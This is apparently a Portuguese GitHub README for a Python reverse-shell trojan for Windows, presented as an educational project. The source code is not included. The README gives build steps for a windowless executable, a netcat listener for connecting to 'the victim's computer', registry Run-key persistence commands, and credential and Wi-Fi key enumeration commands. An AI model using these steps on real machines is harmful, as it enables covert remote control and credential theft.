  ## 🐍 Python Reverse Shell — Estudos de Cibersegurança - Trojan Desenvolvido para Windows

Projeto desenvolvido em Python com o objetivo de estudar conceitos de comunicação via sockets TCP, arquitetura cliente-servidor e funcionamento de conexões reversas (*Reverse Shell*).

## 🎯 Objetivo

Compreender como funciona uma conexão reversa, na qual uma aplicação cliente inicia uma conexão com um servidor, permitindo estudar conceitos importantes de redes e segurança da informação.

## 🛠️ Tecnologias utilizadas

- **Python**
- `socket` — Comunicação através de sockets TCP.
- `subprocess` — Estudo da execução de processos no sistema operacional.
- `os` — Manipulação de diretórios.
- `shutil` — Operações de cópia de arquivos.
- `winreg` — Estudo da manipulação do Registro do Windows.
- `sys` — Acesso a informações do interpretador e executável.
- `time` — Controle de intervalos de execução.
- `PyInstaller` — Empacotamento de aplicações Python em executáveis.

### ⚙️ Configuração do endereço IP

O endereço IP utilizado pelo projeto está definido diretamente no código-fonte (*hardcoded*).

Antes de realizar testes no laboratório, verifique se o endereço configurado corresponde à máquina de testes autorizada.

```python
IP = "192.168.1.xx"
```
Informe o IP da máquina sua de ataque.

O endereço apresentado é apenas um exemplo. Caso utilize outro ambiente de laboratório, será necessário ajustar a configuração correspondente antes de gerar o executável novamente.

**Importante:** após qualquer alteração no código-fonte, gere novamente o executável utilizando o PyInstaller para incorporar as mudanças.

## ⚙️ Conceitos estudados

- Comunicação TCP/IP.
- Arquitetura cliente-servidor.
- Reverse Shell.
- Comunicação entre processos.
- Execução de comandos no sistema operacional.
- Tratamento de exceções.
- Variáveis de ambiente.
- Criação de executáveis com PyInstaller.

## 📡 Funcionamento

O projeto explora o conceito de conexão reversa:

1. O cliente inicia uma conexão TCP com um servidor previamente configurado.
2. O servidor recebe a conexão.
3. O cliente permanece aguardando mensagens.
4. O encerramento da conexão é controlado por uma mensagem específica.

O código também explora a utilização de processos externos e a manipulação de diretórios.

## 📦 Instalação

Clone o repositório:

```bash
git clone https://github.com/Marcossousadev/trojan.git
```

Instale as dependências:

```bash
pip install pyinstaller
```

## 🔧 Configuração

As configurações de rede do projeto estão definidas diretamente no código-fonte.

Para manter o ambiente de laboratório organizado, utilize configurações específicas da sua máquina de testes e evite publicar informações privadas no GitHub.

## 🏗️ Geração do executável

Após finalizar as configurações e revisar o código, utilize o PyInstaller:

```bash
pyinstaller -F --clean -w trojan.py
```

O arquivo executável será gerado no diretório:

```text
dist/
```

**Observação:** sempre que houver alterações no código-fonte, será necessário gerar novamente o executável para incorporar as mudanças.


## 🔌 Netcat / Ncat

Para estudar comunicação TCP entre máquinas, podemos utilizar ferramentas como **Netcat (nc)** e **Ncat**.

Essas ferramentas permitem testar conexões de rede, verificar portas e analisar a comunicação entre aplicações.

### Instalação

**Windows**

O Ncat é distribuído junto ao Nmap.

Site oficial: https://nmap.org/download.html

**Kali Linux / Debian**

```bash
sudo apt update
sudo apt install netcat-openbsd
```

### Verificando a instalação

No Windows:

```powershell
ncat --version
```

No Linux:

```bash
nc -h
```

## Como se conectar ao computador da vitima

No Windows execute:

```bash
ncat -lv 443
```

No Kali Linux:

```bash
nc -lv 443
```

Meu conselho é instalar em uma máquina virtual essas ferramentas!

## 🔌 Comandos internos

O projeto possui comandos personalizados que são interpretados diretamente pela aplicação Python.

| Comando | Comportamento |
|---|---|
| `/exit` | Encerra a sessão TCP atual. |
| `/check_persistence` | Verifica a existência da entrada de persistência no Registro do Windows. |
| `/setup_persistence` | Executa a rotina de configuração de persistência. |

Esses comandos são tratados internamente pela função `cmd()`, responsável por identificar instruções específicas da aplicação.


### Aplicações

- Testes de conectividade TCP.
- Diagnóstico de portas.
- Comunicação entre aplicações.
- Análise de tráfego em laboratórios.
- Estudos sobre protocolos de rede.
- Mecanismos de Persistência no Windows

### Observação

Netcat e Ncat são ferramentas diferentes, embora tenham funcionalidades semelhantes. A disponibilidade de opções e parâmetros pode variar conforme a implementação e o sistema operacional.

Utilize essas ferramentas somente em redes e máquinas próprias ou com autorização explícita.

## 📚 Aprendizados

Este projeto foi desenvolvido para aprofundar meus conhecimentos em Python, comunicação de rede e fundamentos de cibersegurança, explorando na prática conceitos relacionados a conexões TCP, arquitetura cliente-servidor e execução de processos.

## 💻 Comandos importantes do PowerShell / Windows

Durante os testes em laboratório, alguns comandos nativos do Windows podem ajudar a entender melhor o ambiente operacional.

### 👤 Informações de usuários

Listar os usuários cadastrados no Windows:

```powershell
net user
```

Identificar o nome do computador:

```powershell
hostname
```

### 🌐 Informações de rede

Consultar as configurações de rede:

```powershell
ipconfig
```

Listar os perfis de redes Wi-Fi salvos:

```powershell
netsh wlan show profiles
```

Consultar informações de um perfil Wi-Fi próprio, incluindo a chave quando permitido:

```powershell
netsh wlan show profile name="NOME_REDE"
```

### ⚙️ Processos do sistema

Listar os processos em execução:

```powershell
tasklist
```

Encerrar um processo pelo seu PID:

```powershell
taskkill /PID NUMERO_DO_PROCESSO /F
```

O comando `taskkill` permite finalizar um processo utilizando seu identificador (PID). Utilize-o somente em processos que você administra.

### 🔐 Credenciais armazenadas

Consultar os nomes das credenciais registradas no Gerenciador de Credenciais do Windows:

```powershell
cmdkey /list
```

**Observação:** esse comando pode exibir informações sensíveis sobre contas e serviços. Não compartilhe sua saída publicamente.

### 🖥️ Informações do sistema operacional

Consultar informações detalhadas sobre o sistema operacional e o hardware:

```powershell
systeminfo
```

Esse comando apresenta informações como versão do Windows, fabricante, memória, arquitetura e dados de inicialização.

## 📚 Objetivo dos comandos

Esses comandos ajudam a compreender como funciona a administração do Windows através do terminal, explorando informações sobre:

- Usuários e contas do sistema.
- Identificação da máquina.
- Configurações de rede.
- Processos em execução.
- Gerenciamento de processos.
- Informações do sistema operacional.

Esses conhecimentos também são importantes para entender conceitos de reconhecimento de sistemas (*System Enumeration*) em ambientes de laboratório autorizados.

## 🪟 Persistência no Windows

Uma das funcionalidades estudadas nesta versão é o mecanismo de persistência do Windows.

Persistência é uma técnica que permite que um programa continue sendo iniciado automaticamente após determinados eventos, como o login do usuário.

### Conceitos estudados

- Variáveis de ambiente do Windows.
- Diretórios pertencentes ao perfil do usuário.
- Registro do Windows (Windows Registry).
- Chaves de inicialização automática.
- Manipulação de arquivos executáveis.

### Registro do Windows

O Windows possui diferentes mecanismos de inicialização automática.

Uma das áreas utilizadas para esse tipo de configuração é:

`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`

Essa chave permite que aplicações configuradas nela sejam iniciadas durante o login do usuário correspondente.

**Importante:** entradas desconhecidas nessa localização podem representar riscos de segurança e devem ser investigadas.

## 🔄 Reconexão automática

Outro conceito estudado é o tratamento de falhas durante uma comunicação TCP.

Em aplicações cliente-servidor, uma conexão pode ser interrompida por diversos motivos:

- Indisponibilidade do servidor.
- Problemas de conectividade.
- Interrupção da comunicação.
- Encerramento inesperado do processo.

O projeto utiliza intervalos de espera e tratamento de exceções para estudar como aplicações lidam com falhas de comunicação.

## 🔍 Análise de persistência no Windows

Para investigar aplicações configuradas para inicialização automática, podemos utilizar ferramentas nativas do Windows.

### Consultar entradas de inicialização

```powershell
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
```

## ⚠️ Aviso de segurança

Este projeto possui finalidade exclusivamente educacional, sendo destinado ao estudo de redes de computadores e segurança da informação.

Técnicas de Reverse Shell podem ser utilizadas em ataques cibernéticos. Qualquer experimentação deve ocorrer exclusivamente em ambientes isolados, em máquinas próprias ou com autorização explícita.

**Não utilize este projeto em sistemas de terceiros sem autorização.****
